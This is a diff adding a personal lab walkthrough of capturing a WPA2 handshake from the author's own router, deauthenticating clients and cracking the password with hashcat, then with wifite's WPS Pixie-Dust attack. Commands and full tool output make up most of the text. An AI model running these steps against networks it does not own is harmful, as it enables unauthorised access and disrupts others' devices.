@@ -1,0 +1,122 @@
+Lets capture a handshake from the router.
+
+I can use a lot of programs for this (like wifite), but i will try the original way...
+Let's start monitoring the "air":
+
+sudo airodump-ng wlan0
+
+In the list, i found my router:
+BSSID                  PWR     Beacons         #Data         #/s     CH      MB      ENC      CIPHER      AUTH          ESSID
+**:**:**:**:**:**      -38          97            24           0      11    270     WPA2        CCMP       PSk   TP-LINK_055A
+
+next step is monitoring specially this router...
+
+sudo airodump-ng -c [CH] --bssid [BSSID] -w ~/Downloads/test wlan0
+
+and while monitoring the router, lets deauthenticate something from the router (like a phone...or anything)
+
+sudo aireplay-ng -0 5 -a [BSSID] wlan0
+
+And when you will get a handshake then you will get a file, a .cap file, which is not good for me...so lets create a hc22000 format from it: 
+/////side quest...the virtual machine can't use my GPU's full potential. So i've created a shared folder on my Endeavour
+with mkdir vbox_share
+In the settings menu of virtualbox i shared this directory, and restarted kali.
+Then in kali terminal i typed this:
+
+sudo mount -t vboxsf vbox_share /mnt
+In root mode i copied my file into /mnt and it automatically shared with my main OS, where i can use my GPUs full potential./////
+
+hcxpcapngtool -o test.hc22000 test.cap
+
+Since its my router, i know that the password is 8 numbers.
+So lets win out the password:
+hashcat -m 22000 -a 3 test.hc22000 ?d?d?d?d?d?d?d?d
+Session..........: hashcat
+Status...........: Running
+Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
+Hash.Target......: test.hc22000
+Time.Started.....: Wed Feb 18 14:31:22 2026 (25 secs)
+Time.Estimated...: Wed Feb 18 14:36:07 2026 (4 mins, 20 secs)
+Kernel.Feature...: Pure Kernel (password length 8-63 bytes)
+Guess.Mask.......: ?d?d?d?d?d?d?d?d [8]
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:   349.7 kH/s (10.44ms) @ Accel:6 Loops:512 Thr:256 Vec:1
+Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
+Progress.........: 8878080/100000000 (8.88%)
+Rejected.........: 0/8878080 (0.00%)
+Restore.Point....: 860160/10000000 (8.60%)
+Restore.Sub.#01..: Salt:0 Amplifier:9-10 Iteration:0-512
+Candidate.Engine.: Device Generator
+Candidates.#01...: 62878278 -> 67988378
+Hardware.Mon.#01.: Temp: 61c Util: 96% Core:2415MHz Mem:8001MHz Bus:8
+
+So I have 4 mins 20 secs until I will get the password...
+And it's done:
+1dae468edd9bbffc76696aeb7a8b6591:98ded04e055a:94f8273e8b54:TP-LINK_055A:38643248
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
+Hash.Target......: test.hc22000
+Time.Started.....: Wed Feb 18 14:31:22 2026 (4 mins, 4 secs)
+Time.Estimated...: Wed Feb 18 14:35:26 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 8-63 bytes)
+Guess.Mask.......: ?d?d?d?d?d?d?d?d [8]
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:   345.8 kH/s (10.69ms) @ Accel:6 Loops:512 Thr:256 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 84295680/100000000 (84.30%)
+Rejected.........: 0/84295680 (0.00%)
+Restore.Point....: 8417280/10000000 (84.17%)
+Restore.Sub.#01..: Salt:0 Amplifier:3-4 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...: 32783138 -> 37643404
+Hardware.Mon.#01.: Temp: 65c Util: 99% Core:2370MHz Mem:8001MHz Bus:8
+
+Started: Wed Feb 18 14:31:21 2026
+Stopped: Wed Feb 18 14:35:28 2026
+
+So the password is: 38643248
+
+Lets see another way (which is so much easier)
+Lets use wifite...
+Command is:
+sudo wifite --kill
+
+   .               .    
+ .´  ·  .     .  ·  `.  wifite2 2.7.0
+ :  :  :  (¯)  :  :  :  a wireless auditor by derv82
+ `.  ·  ` /¯\ ´  ·  .´  maintained by kimocoder
+   `     /¯¯¯\     ´    https://github.com/kimocoder/wifite2
+
+ [+] option: kill conflicting processes enabled
+
+    Interface   PHY   Driver              Chipset                                                                                                                                                                                           
+-----------------------------------------------------------------------
+ 1. wlan0       phy0  88XXau              Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac 2T2R DB WLAN Adapter
+
+ [+] Enabling monitor mode on wlan0... enabled!
+
+   NUM                      ESSID   CH  ENCR    PWR    WPS  CLIENT                                                                                                                                                                          
+   ---  -------------------------  ---  -----   ----   ---  ------
+     1            Telekom-******     6  WPA-P   74db  lock    1                                                                                                                                                                             
+     2              TP-LINK_055A    11  WPA-P   63db   yes    6                                                                                                                                                                             
+And a lot of others...But this 2 is mine, so...
+press ctrl+c:
+ [+] Select target(s) (1-10) separated by commas, dashes or all: 
+Lets select the desired wifi: 2
+[+] (1/1) Starting attacks against: **:**:**:**:**:** (TP-LINK_055A)
+ [+] TP-LINK_055A (65db) WPS Pixie-Dust: [4m57s] Cracked WPS PIN: 38643248                                                                                                                                                                  
+ [+] TP-LINK_055A (65db) WPS Pixie-Dust: [4m55s] Cracked WPS PSK: 38643248                                                                                                                                                                  
+ [+]        ESSID: TP-LINK_055A                                                                                                                                                                                                             
+ [+]        BSSID: **:**:**:**:**:**
+ [+]   Encryption: WPA (WPS)
+ [+]      WPS PIN: 38643248
+ [+] PSK/Password: 38643248
+ [+] saved crack result to cracked.json (1 total)
+ [+] Finished attacking 1 target(s), exiting
+ [!] Note: Leaving interface in Monitor Mode!
+ [!] To disable Monitor Mode when finished: airmon-ng stop wlan0
+
+And the password is there again, and that's it.
+
